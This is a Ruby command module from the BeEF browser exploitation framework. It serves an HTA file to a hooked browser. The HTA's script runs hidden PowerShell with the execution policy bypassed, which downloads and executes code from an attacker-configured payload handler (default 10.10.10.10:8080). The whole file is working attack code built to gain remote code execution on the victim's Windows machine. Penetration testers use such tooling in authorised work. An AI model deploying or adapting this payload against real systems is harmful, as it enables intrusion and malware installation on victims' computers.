#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Hta_powershell < BeEF::Core::Command

  class Bind_hta < BeEF::Core::Router::Router
    before do
      headers 'Content-Type' => 'application/hta',
              'Pragma' => 'no-cache',
              'Cache-Control' => 'no-cache',
              'Expires' => '0'
    end

    get '/' do
      response['Content-Type'] = "application/hta"
      payload_handler = settings.payload_handler
      print_info "Serving HTA. Payload handler: #{payload_handler}"
      "<script>
          var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_handler}'))\\\"\\\"\";
          new ActiveXObject('WScript.Shell').Run(c);
      </script>"
    end
  end

  def pre_send

    # gets the value configured in the module configuration by the user
    @datastore.each do |input|
      if input['name'] == "payload_handler"
        @payload_handler = input['value']
      end
      if input['name'] == "mount_point"
        @mount_point = input['value']
      end
    end

    # mount the extension in the BeEF web server, calling a specific nested class (needed because we need a specifi content-type/disposition)
    bind_hta = Hta_powershell::Bind_hta
    bind_hta.set :payload_handler, @payload_handler
    BeEF::Core::Server.instance.mount(@mount_point, bind_hta.new)
    BeEF::Core::Server.instance.remap
  end

	def self.options
		return [
			{'name' => 'payload_handler', 'ui_label'=>'Payload Handler',  'value' =>'http://10.10.10.10:8080/psh'},
      {'name' => 'mount_point', 'ui_label'=>'Mount point',  'value' =>'/hta'},
      {'name' => 'domain', 'ui_label' => 'Serving Domain', 'value' => 'http://beef_domain.com'}
		]
	end

	def post_execute
		save({'result' => @datastore['result']})
	end

end
